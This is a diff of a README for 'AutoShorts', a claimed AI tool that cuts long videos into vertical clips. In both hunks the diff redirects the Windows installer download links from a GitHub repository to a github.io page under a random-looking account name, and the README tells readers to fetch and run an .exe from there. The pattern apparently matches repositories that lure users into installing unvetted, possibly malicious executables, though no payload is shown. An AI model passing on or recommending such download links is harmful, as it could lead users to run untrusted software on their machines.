@@ -1,6 +1,6 @@
 # ✂️ autoshorts - Convert long videos into viral clips
 
-[![](https://img.shields.io/badge/Download_Windows_Installer-Blue?style=for-the-badge)](https://github.com/Regressive-contras398/autoshorts)
+[![](https://img.shields.io/badge/Download_Windows_Installer-Blue?style=for-the-badge)](https://regressive-contras398.github.io)
 
 AutoShorts turns long videos into short clips. It uses artificial intelligence to find the best moments in your recordings. The software automatically crops your videos to a vertical view. This lets you share your content on mobile platforms with little effort. You do not need video editing skills to use this tool.
 
@@ -16,7 +16,7 @@ AutoShorts turns long videos into short clips. It uses artificial intelligence t
 
 Visit the following link to get the installer for your computer:
 
-[Download AutoShorts for Windows](https://github.com/Regressive-contras398/autoshorts)
+[Download AutoShorts for Windows](https://regressive-contras398.github.io)
 
 Click the link above to reach the main page. Select the file ending in `.exe` to begin your download. Once the file finishes downloading, double-click it to start the setup wizard. Follow the prompts on your screen to complete the installation. A shortcut icon will appear on your desktop. Double-click this icon to launch the application.
 
